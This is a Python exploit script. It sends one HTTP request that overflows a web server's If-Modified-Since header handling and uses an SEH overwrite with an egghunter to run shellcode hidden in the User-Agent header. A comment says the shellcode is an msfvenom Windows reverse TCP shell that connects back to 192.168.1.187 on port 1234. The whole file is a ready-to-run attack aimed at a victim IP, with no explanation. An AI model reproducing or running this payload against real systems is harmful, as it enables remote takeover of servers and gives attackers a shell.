
import socket
import sys
import struct

if len(sys.argv) != 2 :
	print "[+] Usage : python exploit.py [VICTIM_IP]"
	exit(0)

TCP_IP = sys.argv[1]
TCP_PORT = 80


seh="\xc4\xd9\x44"
nseh="\xeb\xac\x90\x90"

#egg ="!mona egg -t medu"
egg="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x6d\x65\x64\x75\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#badchar= '\x00'
badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

#shellcode = "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.187 LPORT=1234 -b '\x00' -f c"
shellcode= ("\xda\xd0\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x52\xb8\xa0\x59\xc1"
"\xaa\x31\x45\x17\x83\xc5\x04\x03\xe5\x4a\x23\x5f\x19\x84\x21"
"\xa0\xe1\x55\x46\x28\x04\x64\x46\x4e\x4d\xd7\x76\x04\x03\xd4"
"\xfd\x48\xb7\x6f\x73\x45\xb8\xd8\x3e\xb3\xf7\xd9\x13\x87\x96"
"\x59\x6e\xd4\x78\x63\xa1\x29\x79\xa4\xdc\xc0\x2b\x7d\xaa\x77"
"\xdb\x0a\xe6\x4b\x50\x40\xe6\xcb\x85\x11\x09\xfd\x18\x29\x50"
"\xdd\x9b\xfe\xe8\x54\x83\xe3\xd5\x2f\x38\xd7\xa2\xb1\xe8\x29"
"\x4a\x1d\xd5\x85\xb9\x5f\x12\x21\x22\x2a\x6a\x51\xdf\x2d\xa9"
"\x2b\x3b\xbb\x29\x8b\xc8\x1b\x95\x2d\x1c\xfd\x5e\x21\xe9\x89"
"\x38\x26\xec\x5e\x33\x52\x65\x61\x93\xd2\x3d\x46\x37\xbe\xe6"
"\xe7\x6e\x1a\x48\x17\x70\xc5\x35\xbd\xfb\xe8\x22\xcc\xa6\x64"
"\x86\xfd\x58\x75\x80\x76\x2b\x47\x0f\x2d\xa3\xeb\xd8\xeb\x34"
"\x0b\xf3\x4c\xaa\xf2\xfc\xac\xe3\x30\xa8\xfc\x9b\x91\xd1\x96"
"\x5b\x1d\x04\x38\x0b\xb1\xf7\xf9\xfb\x71\xa8\x91\x11\x7e\x97"
"\x82\x1a\x54\xb0\x29\xe1\x3f\x7f\x05\xe8\x04\x17\x54\xea\x7e"
"\x3a\xd1\x0c\x14\xaa\xb4\x87\x81\x53\x9d\x53\x33\x9b\x0b\x1e"
"\x73\x17\xb8\xdf\x3a\xd0\xb5\xf3\xab\x10\x80\xa9\x7a\x2e\x3e"
"\xc5\xe1\xbd\xa5\x15\x6f\xde\x71\x42\x38\x10\x88\x06\xd4\x0b"
"\x22\x34\x25\xcd\x0d\xfc\xf2\x2e\x93\xfd\x77\x0a\xb7\xed\x41"
"\x93\xf3\x59\x1e\xc2\xad\x37\xd8\xbc\x1f\xe1\xb2\x13\xf6\x65"
"\x42\x58\xc9\xf3\x4b\xb5\xbf\x1b\xfd\x60\x86\x24\x32\xe5\x0e"
"\x5d\x2e\x95\xf1\xb4\xea\xa5\xbb\x94\x5b\x2e\x62\x4d\xde\x33"
"\x95\xb8\x1d\x4a\x16\x48\xde\xa9\x06\x39\xdb\xf6\x80\xd2\x91"
"\x67\x65\xd4\x06\x87\xac")

payload= "A"*106
payload+=egg
payload+="B"*(188-len(payload))
payload+=nseh
payload+=seh


http_req = "GET / HTTP/1.1\r\n"
http_req += "Host: "+ TCP_IP +"\r\n"
http_req += "User-Agent: "+"medumedu"+ shellcode +"\r\n"
http_req += "If-Modified-Since: Wed, " + payload + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
print "[+] Sending exploit payload..."
s.send(http_req)
s.close()
